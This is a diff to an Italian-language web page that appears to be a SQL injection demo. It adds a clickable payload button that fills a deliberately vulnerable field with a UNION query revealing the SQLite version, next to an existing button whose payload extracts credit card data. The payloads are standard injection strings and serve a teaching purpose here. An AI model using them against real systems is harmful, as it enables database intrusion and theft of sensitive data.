@@ -49,6 +49,9 @@
                 <div class="payload-item" style="background: white; padding: 8px 12px; border-radius: 6px; margin-bottom: 5px; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #dc3545; cursor: pointer;" onclick="document.getElementById('nameVuln').value=&quot;' UNION SELECT credit_card FROM sensitive_data--&quot;">
                     <strong>Attacco UNION:</strong> ' UNION SELECT credit_card FROM sensitive_data--
                 </div>
+                <div class="payload-item" style="background: white; padding: 8px 12px; border-radius: 6px; margin-bottom: 5px; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #dc3545; cursor: pointer;" onclick="document.getElementById('nameVuln').value=&quot;%' UNION SELECT 'SQLite ' || sqlite_version() --&quot;">
+                    <strong>Versione SQLite:</strong> %' UNION SELECT 'SQLite ' || sqlite_version() --
+                </div>
             </div>
             <div id="resultVulnerable" class="result-box"></div>
         </div>
